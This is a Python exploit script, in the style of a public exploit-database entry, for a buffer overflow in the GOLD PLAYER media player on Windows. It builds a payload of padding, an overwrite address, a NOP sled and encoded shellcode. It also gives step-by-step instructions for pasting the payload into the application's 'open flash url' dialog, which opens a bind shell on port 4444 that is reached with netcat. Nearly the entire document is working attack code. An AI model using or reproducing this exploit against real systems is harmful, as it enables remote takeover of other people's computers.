#!/usr/bin/python
# EXPLOIT TITLE: GOLD PLAYER Local Exploit
# AUTHOR: Vivek Mahajan - C3p70r
# Credits: Gabor Seljan  
# Date of Testing: 30 October 2015
# Download Link : http://download.cnet.com/GoldMP4Player/3000-2139_4-10967424.html
# Tested On : Windows 8.1 Pro and Windows 7 Ultimate
# Steps to Exploit
# Step 1: Execute this python script
# Step 2: This script will create a file called buffer.txt
# Step 3: Open the file buffer.txt and copy the contents.
# Step 4: Open the Gold Player application -> file -> open flash url and paste the contents
# Step 5: Click on Open
# That should open a bind tcp port at 4444
# Step 4: Connect with netcat at port 4444
 
 
buffer = "A"*280
 
buffer += "\x83\x34\x04\x10"
 
buffer += "\x90"*100
 
buffer += ("\xba\x01\x75\x34\x3a\xdb\xd4\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x53\x31\x57\x12\x03\x57\x12\x83\xc6\x71\xd6\xcf\x34\x91\x94"
"\x30\xc4\x62\xf9\xb9\x21\x53\x39\xdd\x22\xc4\x89\x95\x66\xe9"
"\x62\xfb\x92\x7a\x06\xd4\x95\xcb\xad\x02\x98\xcc\x9e\x77\xbb"
"\x4e\xdd\xab\x1b\x6e\x2e\xbe\x5a\xb7\x53\x33\x0e\x60\x1f\xe6"
"\xbe\x05\x55\x3b\x35\x55\x7b\x3b\xaa\x2e\x7a\x6a\x7d\x24\x25"
"\xac\x7c\xe9\x5d\xe5\x66\xee\x58\xbf\x1d\xc4\x17\x3e\xf7\x14"
"\xd7\xed\x36\x99\x2a\xef\x7f\x1e\xd5\x9a\x89\x5c\x68\x9d\x4e"
"\x1e\xb6\x28\x54\xb8\x3d\x8a\xb0\x38\x91\x4d\x33\x36\x5e\x19"
"\x1b\x5b\x61\xce\x10\x67\xea\xf1\xf6\xe1\xa8\xd5\xd2\xaa\x6b"
"\x77\x43\x17\xdd\x88\x93\xf8\x82\x2c\xd8\x15\xd6\x5c\x83\x71"
"\x1b\x6d\x3b\x82\x33\xe6\x48\xb0\x9c\x5c\xc6\xf8\x55\x7b\x11"
"\xfe\x4f\x3b\x8d\x01\x70\x3c\x84\xc5\x24\x6c\xbe\xec\x44\xe7"
"\x3e\x10\x91\x92\x36\xb7\x4a\x81\xbb\x07\x3b\x05\x13\xe0\x51"
"\x8a\x4c\x10\x5a\x40\xe5\xb9\xa7\x6b\x18\x66\x21\x8d\x70\x86"
"\x67\x05\xec\x64\x5c\x9e\x8b\x97\xb6\xb6\x3b\xdf\xd0\x01\x44"
"\xe0\xf6\x25\xd2\x6b\x15\xf2\xc3\x6b\x30\x52\x94\xfc\xce\x33"
"\xd7\x9d\xcf\x19\x8f\x3e\x5d\xc6\x4f\x48\x7e\x51\x18\x1d\xb0"
"\xa8\xcc\xb3\xeb\x02\xf2\x49\x6d\x6c\xb6\x95\x4e\x73\x37\x5b"
"\xea\x57\x27\xa5\xf3\xd3\x13\x79\xa2\x8d\xcd\x3f\x1c\x7c\xa7"
"\xe9\xf3\xd6\x2f\x6f\x38\xe9\x29\x70\x15\x9f\xd5\xc1\xc0\xe6"
"\xea\xee\x84\xee\x93\x12\x35\x10\x4e\x97\x45\x5b\xd2\xbe\xcd"
"\x02\x87\x82\x93\xb4\x72\xc0\xad\x36\x76\xb9\x49\x26\xf3\xbc"
"\x16\xe0\xe8\xcc\x07\x85\x0e\x62\x27\x8c")
 
buffer += ".swf"
 
file = open('buffer.txt', 'w')
file.write(buffer)
file.close()
 
 
# Follow on Twitter @c3p70r
